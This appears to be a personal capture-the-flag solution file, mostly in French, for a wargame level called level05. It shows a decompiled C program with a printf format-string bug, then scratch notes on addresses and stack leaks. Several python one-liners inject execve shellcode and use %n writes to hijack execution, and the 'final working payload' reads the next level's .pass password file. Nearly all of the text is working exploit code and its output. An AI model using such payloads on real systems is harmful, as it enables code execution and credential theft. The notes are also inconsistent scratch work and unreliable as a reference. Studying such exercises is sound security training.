int main(void)
{
	//
	char buffer[100] ; //0x28
	int i = 0; //0x8c +14 ou alors un pointeur et en fait c'est un double tableau[2] = NULL

	fgets(buffer, 100, stdin);
	//jump a +143
	while ( i < strlen(buffer)) //+143 - +186
	{
		if (buffer[i] >= 'A' && buffer[i] <= 'Z') // +67-+81 +85-+99 hex 41 - 59
		{
			buffer[i] += 32; //to min
		}
		//jump to +135
		i++;
	}
	printf(buffer);
	exit(0);
}


//eip 0x804850c  //pointeur vers fonction "appele avant"...
//ebp 0xffffd708 //ancienne addr de la stack => argument en param
//esp 0xffffd670 //addresse de la stack

//addresse of buffer = 0xffffd69d

//0x80497e0 printf
//0x80497d4 payload + remplissage pour arriver a la valeur de l'addresse du payload + decalage de la stack jusqu'au exit/printf + %n
python -c "print('\xd4\x97\x04\x08' + %p %p %p %p %p %p %p %p %p + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x0c\xa0\x04\x08\x00' %n)"
//addresse du exit 0x0804851

//addresse du payload = addresse de buffer + 4

//  0xffffd6d9
// [ EXIT ][ EXIT - 2 ][PAYLOAD][PADDING][%n][PADDING][%n]
0x80497e0
0xffffd6a4
//\xe0\x97\x04\x08\xde\x97\x04\x08\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x0c\xa0\x04\x08


r <<< $(python -c "print('\xe0\x97\x04\x08aaaa\xe2\x97\x04\x08\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x0c\xa0\x04\x08%3000p%51848p%p%p%p%p%p%p%p%10n %10585p %n')")
(python -c "print('\xe0\x97\x04\x08aaaa\xe2\x97\x04\x08\x31\xc9\xf7\xe1\x6a\x0b\x5f\x89\xf8\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x6a\x01\x5f\x89\xf8\xcd\x80%2993p%51851p%p%p%p%p%p%p%p%10n %10585p %n')"; cat) | ltrace /home/users/level05/level05
0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be(nil) 0xffffffff 0xffffd744 (nil)
0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be (nil)0xffffffff 0xffffd744(nil)
0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be(nil)0xffffffff 0xffffd744(nil)
                      0xfffff670
                             79

0xf7fcfac0 0xf7ec3af9 0xffffd6af 0xffffd6ae(nil) 0xffffffff 0xffffd734 0xf7fdb000 // NEW
0x64
0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be(nil) 0xffffffff 0xffffd744 (nil)

0xf7fcfac0 0xf7ec3af9 0xffffd6af 0xffffd6ae(nil) 0xffffffff 0xffffd734(nil)

0xf7fcfac0 0xf7ec3af9 0xffffd6af 0xffffd6ae(nil) 0xffffffff 0xffffd734 0xf7fdb000
                      0xfffff660
                              79

0xf7fcfac0 0xf7ec3af9 0xffffd6af 0xffffd6ae(nil) 0xffffffff 0xffffd734 0xf7fdb000

0xf7fcfac0 0xf7ec3af9 0xffffd6ef 0xffffd6ee(nil) 0xffffffff 0xffffd774(nil)


0xf7fcfac0 0xf7ec3af9 0xffffd6af 0xffffd6ae(nil) 0xffffffff 0xffffd734 0xf7fdb000
0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be(nil) 0xffffffff 0xffffd744 (nil)


PAYLOAD FINAL DE LA MORT QUI FONCTIONNE HALLELLUJAH:
```
(python -c "print('\xe0\x97\x04\x08aaaa\xe2\x97\x04\x08\x31\xc9\xf7\xe1\x6a\x0b\x5f\x89\xf8\x6a\x68\x68\x2f\x64\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x6a\x01\x5f\x89\xf8\xcd\x80%2993p%51830p%p%p%p%p%p%p%p%10n %10601p %n')"; echo "cat /home/users/level06/.pass") | /home/users/level05/level05
```
